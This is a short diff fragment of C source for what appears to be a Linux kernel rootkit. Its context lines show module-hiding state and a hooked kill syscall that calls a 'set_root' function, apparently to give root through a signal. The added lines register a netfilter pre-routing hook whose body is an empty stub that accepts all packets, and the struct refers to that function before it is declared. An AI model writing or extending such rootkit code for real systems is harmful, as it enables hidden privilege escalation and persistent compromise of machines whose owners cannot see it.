@@ -3,8 +3,26 @@
 static struct list_head *prev_module;
 static short hidden = 0;
 
-static asmlinkage long (*orig_kill)(const struct pt_regs *);
+struct nf_hook_ops my_nfho = {
+      .hook        = my_nf_hookfn,
+      .hooknum     = NF_INET_PRE_ROUTING,
+      .pf          = PF_INET,
+      .priority    = NF_IP_PRI_FIRST
+};
 
+
+static unsigned int my_nf_hookfn(void *priv,
+              struct sk_buff *skb,
+              const struct nf_hook_state *state)
+{
+      /* process packet */
+      //...
+
+      return NF_ACCEPT;
+}
+
+
+static asmlinkage long (*orig_kill)(const struct pt_regs *);
 asmlinkage int hook_kill(const struct pt_regs *regs)
 {
     void set_root(void);
